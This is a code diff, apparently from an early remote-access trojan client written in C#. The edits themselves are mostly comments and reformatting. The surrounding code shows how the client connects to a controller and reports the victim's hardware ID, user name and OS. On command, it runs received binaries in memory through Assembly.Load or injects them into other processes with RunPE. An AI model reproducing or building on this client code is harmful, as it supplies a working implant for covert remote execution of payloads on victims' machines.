@@ -23,6 +23,7 @@ using System.Security.Cryptography;
 
 namespace Client
 {
+    /// The Main Settings
     class Settings
     {
         public static readonly string IP = "127.0.0.1";
@@ -30,6 +31,8 @@ namespace Client
         public static readonly string Version = "0.2.2";
     }
 
+    /// The Main Class
+    /// Contains all methods for socket and reading the packets
     class Program
     {
         public static Socket Client { get; set; }
@@ -49,16 +52,17 @@ namespace Client
             }
         }
 
+        /// Initialization variables and connect to socket.
         public static void InitializeClient()
         {
             try
             {
                 Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
-                ReceiveBufferSize = 50 * 1024,
-                SendBufferSize = 50 * 1024,
-                ReceiveTimeout = -1,
-                SendTimeout = -1,
+                    ReceiveBufferSize = 50 * 1024,
+                    SendBufferSize = 50 * 1024,
+                    ReceiveTimeout = -1,
+                    SendTimeout = -1,
                 };
                 Client.Connect(Settings.IP, Settings.Port);
                 Debug.WriteLine("Connected!");
@@ -66,7 +70,7 @@ namespace Client
                 Buffersize = 0;
                 BufferRecevied = false;
                 MS = new MemoryStream();
-                SendSync  = new object();
+                SendSync = new object();
                 BeginSend(SendInfo());
                 TimerCallback T = Ping;
                 Tick = new System.Threading.Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
@@ -80,6 +84,7 @@ namespace Client
             }
         }
 
+        /// Cleanup everything and start to connect again.
         public static void Reconnect()
         {
             if (Client.Connected) return;
@@ -88,11 +93,8 @@ namespace Client
 
             try
             {
-                if (Client != null)
-                {
-                    Client.Close();
-                    Client.Dispose();
-                }
+                Client?.Close();
+                Client?.Dispose();
             }
             catch { }
 
@@ -101,13 +103,14 @@ namespace Client
             InitializeClient();
         }
 
+        /// Method to send our ID to server's listview.
         private static byte[] SendInfo()
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
             msgpack.ForcePathObject("HWID").AsString = HWID();
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
-            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString()+ " " + Environment.Is64BitOperatingSystem.ToString().Replace("True","64bit").Replace("False","32bit");
+            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString() + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             return msgpack.Encode2Bytes();
         }
 
@@ -132,6 +135,8 @@ namespace Client
             return strResult.ToString().Substring(0, 12).ToUpper();
         }
 
+        /// get the length of the buffer by reading byte by byte [1]
+        /// until we get the full size.
         public static void ReadServertData(IAsyncResult ar)
         {
             try
@@ -195,6 +200,7 @@ namespace Client
             }
         }
 
+        /// Handle the packet
         public static void Read(object Data)
         {
             try
@@ -238,14 +244,13 @@ namespace Client
                             Thread thread = null;
                             if (Injection.Length == 0)
                             {
-                                 thread = new Thread(new ParameterizedThreadStart(SendToMemory));
+                                thread = new Thread(new ParameterizedThreadStart(SendToMemory));
                             }
                             else
                             {
-                                 thread = new Thread(new ParameterizedThreadStart(RunPE));
+                                thread = new Thread(new ParameterizedThreadStart(RunPE));
                             }
                             thread.Start(parameters);
-
                         }
                         break;
 
@@ -304,8 +309,7 @@ namespace Client
         private static void SendToMemory(object obj)
         {
             object[] Obj = (object[])obj;
-            var Buffer = (byte[])Obj[0];
-            var Injection = (string)Obj[1];
+            byte[] Buffer = (byte[])Obj[0];
             Assembly Loader = Assembly.Load(Buffer);
             object[] Parameters = null;
             if (Loader.EntryPoint.GetParameters().Length > 0)
@@ -313,7 +317,6 @@ namespace Client
                 Parameters = new object[] { new string[] { null } };
             }
             Loader.EntryPoint.Invoke(null, Parameters);
-
         }
 
         private static void RunPE(object obj)
@@ -332,12 +335,14 @@ namespace Client
 
         public static void Ping(object obj)
         {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "Ping";
-                msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
-                BeginSend(msgpack.Encode2Bytes());
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "Ping";
+            msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
+            BeginSend(msgpack.Encode2Bytes());
         }
 
+        /// Send
+        /// adding the buffersize in the beginning of the stream
         public static void BeginSend(byte[] buffer)
         {
             lock (SendSync)
